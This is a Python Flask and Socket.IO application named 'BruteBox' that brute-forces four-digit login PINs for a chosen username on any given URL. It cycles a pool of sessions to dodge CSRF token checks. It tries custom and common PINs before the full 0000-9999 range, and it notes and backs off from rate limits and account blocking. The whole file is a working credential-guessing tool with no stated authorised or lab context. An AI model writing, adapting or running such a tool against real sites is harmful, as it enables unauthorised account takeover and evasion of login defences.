import os
import threading
import time
import requests
from bs4 import BeautifulSoup
import concurrent.futures
from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-change-in-production'
socketio = SocketIO(app, cors_allowed_origins="*")

active_tasks = {}
pause_events = {}

class WebBruteForcer:
    def __init__(self, url, username, sid, stop_event, pause_event, custom_pins=None):
        self.url = url.rstrip('/')
        self.username = username
        self.sid = sid
        self.stop_event = stop_event
        self.pause_event = pause_event
        self.custom_pins = custom_pins or []
        self.found = False
        self.attempts = 0
        self.skipped = 0
        self.start_time = time.time()
        self.session_pool = []
        self.pool_lock = threading.Lock()
        self.attempts_lock = threading.Lock()
        self.csrf_lock = threading.Lock()
        self.rate_limit_hits = 0
        self.block_hits = 0
        self.csrf_rotations = 0
        self.response_times = []
        self.last_csrf = None
        self.attempts_since_refresh = 0

    def emit_progress(self, event, data):
        socketio.emit(event, data, room=self.sid)

    def wait_if_paused(self):
        while self.pause_event.is_set() and not self.stop_event.is_set():
            time.sleep(0.3)

    def _extract_csrf(self, html):
        try:
            soup = BeautifulSoup(html, "html.parser")
            el = soup.find("input", {"name": "_token"})
            if el:
                return el["value"]
        except Exception:
            pass
        return None

    def _new_session(self):
        """Always fetch a brand new session with a fresh CSRF token."""
        try:
            session = requests.Session()
            resp = session.get(self.url, timeout=5)
            token = self._extract_csrf(resp.text)
            if token:
                with self.csrf_lock:
                    if self.last_csrf and self.last_csrf != token:
                        self.csrf_rotations += 1
                    self.last_csrf = token
                return {
                    'session': session,
                    'csrf_token': token,
                    'last_used': time.time()
                }
        except Exception:
            pass
        return None

    def _refresh_all_sessions(self):
        """
        Proactive refresh -- discard all pooled sessions and
        rebuild the pool with fresh CSRF tokens.
        Called every 50 attempts to prevent stale token buildup.
        """
        self.emit_progress('log', {
            'message': '[CSRF] Proactive token refresh triggered',
            'type': 'warn'
        })
        with self.pool_lock:
            self.session_pool.clear()

        # Rebuild pool with fresh sessions concurrently
        new_sessions = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=6) as executor:
            futures = [executor.submit(self._new_session) for _ in range(10)]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    new_sessions.append(result)

        with self.pool_lock:
            self.session_pool.extend(new_sessions)

        self.emit_progress('log', {
            'message': f'[CSRF] Pool refreshed -- {len(new_sessions)} fresh sessions ready',
            'type': 'info'
        })

    def create_session_pool(self, size=10):
        self.emit_progress('log', {'message': '[INIT] Spawning session pool...', 'type': 'info'})
        with concurrent.futures.ThreadPoolExecutor(max_workers=6) as executor:
            futures = [executor.submit(self._new_session) for _ in range(size)]
            for future in concurrent.futures.as_completed(futures):
                if self.stop_event.is_set():
                    return False
                result = future.result()
                if result:
                    self.session_pool.append(result)
        self.emit_progress('log', {'message': f'[POOL] {len(self.session_pool)} sessions active', 'type': 'info'})
        return len(self.session_pool) > 0

    def get_session_from_pool(self):
        with self.pool_lock:
            if self.session_pool:
                session_data = self.session_pool.pop(0)
                session_data['last_used'] = time.time()
                return session_data
        return self._new_session()

    def return_session_to_pool(self, session_data):
        if session_data:
            with self.pool_lock:
                self.session_pool.append(session_data)

    def get_security_rating(self):
        score = 0
        signals = []

        if self.rate_limit_hits > 0:
            score += 2
            signals.append(f'Rate limiting detected ({self.rate_limit_hits}x)')
        if self.block_hits > 0:
            score += 3
            signals.append(f'IP/account blocking detected ({self.block_hits}x)')
        if self.csrf_rotations > 5:
            score += 2
            signals.append(f'CSRF token rotation active ({self.csrf_rotations}x)')
        elif self.csrf_rotations > 0:
            score += 1
            signals.append(f'Basic CSRF protection present')

        avg_time = sum(self.response_times) / len(self.response_times) if self.response_times else 0
        if avg_time > 2.0:
            score += 2
            signals.append(f'Intentional response delay (~{avg_time:.1f}s avg)')
        elif avg_time > 1.0:
            score += 1
            signals.append(f'Moderate response time (~{avg_time:.1f}s avg)')

        if score >= 6:
            rating, color = 'FORTRESS', 'fortress'
        elif score >= 4:
            rating, color = 'STRONG', 'strong'
        elif score >= 2:
            rating, color = 'MODERATE', 'moderate'
        else:
            rating, color = 'WEAK', 'weak'

        return {'rating': rating, 'color': color, 'signals': signals, 'score': score}

    def try_mpin(self, mpin):
        if self.found or self.stop_event.is_set():
            return None

        self.wait_if_paused()

        if self.found or self.stop_event.is_set():
            return None

        mpin_str = str(mpin).zfill(4)

        # Proactive CSRF refresh every 50 attempts
        with self.attempts_lock:
            self.attempts_since_refresh += 1
            do_refresh = self.attempts_since_refresh >= 50
            if do_refresh:
                self.attempts_since_refresh = 0

        if do_refresh:
            self._refresh_all_sessions()

        # Get session with retries
        session_data = None
        for _ in range(3):
            session_data = self.get_session_from_pool()
            if session_data:
                break
            time.sleep(0.3)

        if not session_data:
            with self.attempts_lock:
                self.skipped += 1
            self.emit_progress('log', {'message': f'[WARN] Skipped PIN {mpin_str} -- no session', 'type': 'warn'})
            return None

        # Retry same PIN up to 2 times on ambiguous response
        MAX_PIN_RETRIES = 2
        for pin_attempt in range(MAX_PIN_RETRIES):
            if self.found or self.stop_event.is_set():
                break

            try:
                post_data = {
                    "username": self.username,
                    "password": mpin_str,
                    "_token": session_data['csrf_token']
                }

                t_start = time.time()
                response = session_data['session'].post(
                    self.url, data=post_data, timeout=5
                )
                elapsed_req = time.time() - t_start
                self.response_times.append(elapsed_req)

                with self.attempts_lock:
                    self.attempts += 1
                    current_attempts = self.attempts

                if current_attempts % 10 == 0:
                    elapsed = time.time() - self.start_time
                    self.emit_progress('progress', {
                        'attempts': current_attempts,
                        'current': mpin_str,
                        'elapsed': round(elapsed, 1),
                        'speed': round(current_attempts / elapsed, 2) if elapsed > 0 else 0
                    })

                # Handle 419 CSRF mismatch
                if response.status_code == 419:
                    self.emit_progress('log', {
                        'message': f'[CSRF] 419 on {mpin_str} -- fresh session retry',
                        'type': 'warn'
                    })
                    self.csrf_rotations += 1
                    session_data = self._new_session()
                    if session_data and pin_attempt < MAX_PIN_RETRIES - 1:
                        continue
                    else:
                        break

                try:
                    json_response = response.json()
                    if json_response.get("signal") == "success":
                        self.found = True
                        return mpin_str
                    elif "blocked" in str(json_response).lower() or "limit" in str(json_response).lower():
                        self.block_hits += 1
                        self.emit_progress('log', {
                            'message': f'[BLOCK] Defense triggered: {json_response}',
                            'type': 'warn'
                        })
                        session_data = None
                        time.sleep(2)
                        break
                    else:
                        # Wrong PIN -- session still valid, return as-is
                        break

                except Exception:
                    if response.status_code == 302:
                        self.found = True
                        return mpin_str
                    elif response.status_code == 429:
                        self.rate_limit_hits += 1
                        self.emit_progress('log', {
                            'message': '[RATE] Rate limit -- throttling...',
                            'type': 'warn'
                        })
                        session_data = None
                        time.sleep(3)
                        break
                    else:
                        # Unknown response -- get fresh session and retry
                        session_data = self._new_session()
                        if session_data and pin_attempt < MAX_PIN_RETRIES - 1:
                            continue
                        break

            except Exception:
                session_data = None
                break

        if session_data and not self.found and not self.stop_event.is_set():
            self.return_session_to_pool(session_data)

        return None

    def run(self):
        common_pins = [
            1234, 1111, 0000, 1212, 7777, 1004, 2000, 4444, 2222, 6969,
            9999, 3333, 5555, 6666, 1122, 1313, 8888, 4321, 2001, 1010,
            1230, 1235, 1236, 1237, 1238, 1239, 1112, 1113, 1114, 1115,
            1001, 1002, 1003, 1005, 1006, 1007, 1008, 1009, 1011, 1012
        ]

        if not self.create_session_pool(10):
            self.emit_progress('error', {'message': 'Failed to create session pool. Check the URL.'})
            return

        self.emit_progress('log', {'message': '[INIT] BruteBox engine online', 'type': 'info'})

        # Phase 1: Custom wordlist
        if self.custom_pins:
            self.emit_progress('log', {'message': f'[SCAN] Testing {len(self.custom_pins)} custom PINs...', 'type': 'info'})
            for mpin in self.custom_pins:
                if self.stop_event.is_set():
                    self.emit_progress('log', {'message': '[HALT] Operator abort received.', 'type': 'warn'})
                    return
                self.wait_if_paused()
                result = self.try_mpin(mpin)
                if result:
                    security = self.get_security_rating()
                    elapsed = time.time() - self.start_time
                    self.emit_progress('success', {
                        'mpin': result, 'attempts': self.attempts,
                        'elapsed': round(elapsed, 1), 'security': security
                    })
                    return
            self.emit_progress('log', {'message': '[SCAN] Custom list exhausted.', 'type': 'info'})

        # Phase 2: Common PINs
        self.emit_progress('log', {'message': '[SCAN] Loading common PIN dictionary...', 'type': 'info'})
        for i, mpin in enumerate(common_pins):
            if self.stop_event.is_set():
                self.emit_progress('log', {'message': '[HALT] Operator abort received.', 'type': 'warn'})
                return
            self.wait_if_paused()
            result = self.try_mpin(mpin)
            if result:
                security = self.get_security_rating()
                elapsed = time.time() - self.start_time
                self.emit_progress('success', {
                    'mpin': result, 'attempts': self.attempts,
                    'elapsed': round(elapsed, 1), 'security': security
                })
                return
            if (i + 1) % 10 == 0:
                self.emit_progress('log', {'message': f'[SCAN] Dictionary {i+1}/40 tested', 'type': 'info'})

        self.emit_progress('log', {'message': '[SCAN] Dictionary exhausted. Switching to full keyspace...', 'type': 'info'})

        # Phase 3: Full range
        tested = set(common_pins) | set(self.custom_pins)
        all_mpins = [mpin for mpin in range(10000) if mpin not in tested]
        skipped_pins = []
        chunk_size = 50
        chunks = [all_mpins[i:i+chunk_size] for i in range(0, len(all_mpins), chunk_size)]

        for chunk_idx, chunk in enumerate(chunks):
            if self.stop_event.is_set() or self.found:
                break

            self.wait_if_paused()

            if chunk_idx % 10 == 0:
                pct = int((chunk_idx / len(chunks)) * 100)
                bar = '#' * (pct // 5) + '.' * (20 - pct // 5)
                self.emit_progress('log', {
                    'message': f'[SCAN] {chunk[0]:04d}-{chunk[-1]:04d} [{bar}] {pct}%',
                    'type': 'scan'
                })

            # Sequential within chunk to respect proactive refresh every 50
            for mpin in chunk:
                if self.stop_event.is_set() or self.found:
                    break
                self.wait_if_paused()
                result = self.try_mpin(mpin)
                if result:
                    security = self.get_security_rating()
                    elapsed = time.time() - self.start_time
                    self.emit_progress('success', {
                        'mpin': result, 'attempts': self.attempts,
                        'elapsed': round(elapsed, 1), 'security': security
                    })
                    return

        # Phase 4: Retry skipped
        if skipped_pins and not self.stop_event.is_set() and not self.found:
            self.emit_progress('log', {'message': f'[RETRY] Re-testing {len(skipped_pins)} flagged PINs...', 'type': 'info'})
            for mpin in skipped_pins:
                if self.stop_event.is_set() or self.found:
                    break
                self.wait_if_paused()
                result = self.try_mpin(mpin)
                if result:
                    security = self.get_security_rating()
                    elapsed = time.time() - self.start_time
                    self.emit_progress('success', {
                        'mpin': result, 'attempts': self.attempts,
                        'elapsed': round(elapsed, 1), 'security': security
                    })
                    return

        security = self.get_security_rating()
        total_time = time.time() - self.start_time
        self.emit_progress('fail', {
            'attempts': self.attempts,
            'elapsed': round(total_time, 1),
            'security': security
        })


# ---------- Socket.IO event handlers ----------
@socketio.on('connect')
def handle_connect():
    print('Client connected')

@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    if sid in active_tasks:
        active_tasks[sid].set()
        del active_tasks[sid]
    if sid in pause_events:
        del pause_events[sid]
    print('Client disconnected')

@socketio.on('start_bruteforce')
def handle_start(data):
    url = data.get('url')
    username = data.get('username')
    custom_raw = data.get('custom_pins', '')
    sid = request.sid

    if not url or not username:
        emit('error', {'message': 'URL and username are required'})
        return

    custom_pins = []
    if custom_raw:
        for p in custom_raw.replace(',', '\n').splitlines():
            p = p.strip().zfill(4)
            if p.isdigit() and len(p) == 4:
                custom_pins.append(int(p))

    if sid in active_tasks:
        active_tasks[sid].set()

    stop_event = threading.Event()
    pause_event = threading.Event()
    active_tasks[sid] = stop_event
    pause_events[sid] = pause_event

    def task():
        forcer = WebBruteForcer(url, username, sid, stop_event, pause_event, custom_pins)
        forcer.run()
        if sid in active_tasks:
            del active_tasks[sid]
        if sid in pause_events:
            del pause_events[sid]

    thread = threading.Thread(target=task)
    thread.daemon = True
    thread.start()

    emit('log', {'message': '[INIT] BruteBox engaged...', 'type': 'info'})

@socketio.on('pause_bruteforce')
def handle_pause():
    sid = request.sid
    if sid in pause_events:
        pause_events[sid].set()
        emit('log', {'message': '[PAUSE] Operation paused.', 'type': 'warn'})
        emit('paused')

@socketio.on('resume_bruteforce')
def handle_resume():
    sid = request.sid
    if sid in pause_events:
        pause_events[sid].clear()
        emit('log', {'message': '[RESUME] Operation resumed.', 'type': 'info'})
        emit('resumed')

@socketio.on('stop_bruteforce')
def handle_stop():
    sid = request.sid
    if sid in pause_events:
        pause_events[sid].clear()
    if sid in active_tasks:
        active_tasks[sid].set()
        emit('log', {'message': '[HALT] Stop signal received.', 'type': 'warn'})
    else:
        emit('log', {'message': '[WARN] No active operation.', 'type': 'warn'})

@app.route('/')
def index():
    return render_template('index.html')

if __name__ == '__main__':
    socketio.run(app, debug=True)
